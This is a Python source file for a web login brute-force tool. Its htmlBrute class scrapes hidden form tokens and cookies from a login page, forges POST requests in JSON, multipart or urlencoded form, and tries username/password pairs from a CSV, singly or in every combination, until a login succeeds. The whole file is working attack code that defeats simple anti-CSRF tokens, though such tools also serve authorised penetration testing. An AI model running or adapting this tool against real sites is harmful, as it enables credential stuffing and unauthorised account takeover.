import logging
import sys
import requests
from bs4 import BeautifulSoup
import utils


class htmlBrute:
    """
    this class performs a brute force attack using requests library
    each login attempt is actually a forged post packet containing the username, password and may contain
    tokens. the login packets are sent to the login server, each login attempt is checked wether it is
    successful by checking the response status code , content length, html...
    """

    def __init__(self, url, web_parser, pass_user, parallel) -> None:
        self._url = url
        self._web_parser = web_parser
        self._pass_user = pass_user
        self.parallel = parallel

    def brute(self) -> None:
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """

        # attempts each username with the parallel password in the csv file
        if self.parallel:
            index = min(
                len(self._pass_user["Usernames"]), len(self._pass_user["Passwords"])
            )
            for username_index in range(0, index):
                self._attack(
                    self._pass_user["Usernames"][username_index],
                    self._pass_user["Passwords"][username_index],
                )

        # attempts each username with every password in the csv file (cartesian multiplication)
        else:
            for username in self._pass_user["Usernames"]:
                for password in self._pass_user["Passwords"]:
                    self._attack(username, password)

    def _attack(self, username, password) -> None:
        """
        create a packet containing fake headers and the payload(username,password) and submit it to the server
        """

        get_response = requests.get(self._url)
        body = get_response.text

        soup = BeautifulSoup(body, "html.parser")

        payload = self._web_parser.post_data
        cookies = get_response.cookies
        payload[self._web_parser.user_param] = username
        payload[self._web_parser.password_param] = password

        for token in payload:
            if (
                token != self._web_parser.user_param
                and token != self._web_parser.password_param
            ):
                inputs = soup.find("input", {"name": token})
                if inputs:
                    payload[token] = inputs["value"]
                    logging.debug(
                        str(payload[token])
                        + " value has changed to "
                        + str(inputs["value"])
                    )

        payload, cookies = self._change_cookiesToken(cookies, payload)

        logging.info("[+ payload]: " + str(payload))

        post_response = self._post(payload, cookies)

        if utils.check_login(post_response.text, self.status_code, self._web_parser):
            logging.info(
                "login successful\n\nusername: " + username + "\npassword: " + password
            )

            sys.exit(1)

    def _post(self, payload, cookies) -> requests.models.Response:
        """
        sends the login post request with the correct body type (supports json, multipart and urlencoded)
        and fetchs the response status code
        """

        header = self._web_parser.headers
        header["accept-encoding"] = "identity"

        if self._web_parser.req_body_type == "JSON":
            post_response = requests.post(
                self._web_parser.action, json=payload, cookies=cookies, headers=header
            )

        elif self._web_parser.req_body_type == "multipart":
            for param in payload:
                payload[param] = (None, payload[param])
            post_response = requests.post(
                self._web_parser.action, files=payload, cookies=cookies, headers=header
            )

        else:
            post_response = requests.post(
                self._web_parser.action, data=payload, cookies=cookies, headers=header
            )

        if len(post_response.history) > 0:
            self.status_code = post_response.history[0].status_code
        else:
            self.status_code = post_response.status_code
        return post_response

    ########################################################################################

    def _change_cookiesToken(self, cookies_jar, req_body) -> tuple:
        """
        checks if the post request body contains key that are also found in the page's get response
        cookies, if it does the it updates the post request body based on the cookies values
        """
        cookies = {}
        for cookie in cookies_jar:
            cookies[cookie.name] = cookie.value

        for item in cookies.keys():
            if item[1:] in req_body:
                req_body[item[1:]] = cookies[item]
            if item in req_body:
                req_body[item] = cookies[item]
        if len(cookies) == 0:
            cookies = None

        return req_body, cookies
